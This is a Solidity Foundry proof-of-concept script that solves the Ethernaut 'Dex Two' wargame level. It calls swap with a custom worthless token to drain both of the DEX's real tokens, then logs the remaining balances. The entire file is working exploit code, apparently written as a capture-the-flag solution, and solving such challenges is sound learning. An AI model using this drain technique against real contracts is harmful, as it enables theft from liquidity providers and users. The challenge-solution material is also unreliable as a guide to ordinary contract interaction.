// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {DexTwo} from "../src/Dex2.sol";

contract POC is Script {

    DexTwo public dexTwo;

    function run() external{
        vm.startBroadcast();

        dexTwo = DexTwo(0x97e3Bc8E0A6f8550ea7BECcE9aC618f5a438C5F9);
        address BTN = address(0xE3B0bd9d2bd8E3B189E76eFcB6B8598B8d9495Ed);
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();

        dexTwo.swap(BTN, token1, 100);
        dexTwo.swap(BTN, token2, 200);

        console.log("Remaining token1 balance : ", dexTwo.balanceOf(token1, address(dexTwo)));
        console.log("Remaining token2 balance : ", dexTwo.balanceOf(token2, address(dexTwo)));

        vm.stopBroadcast();
    }
}
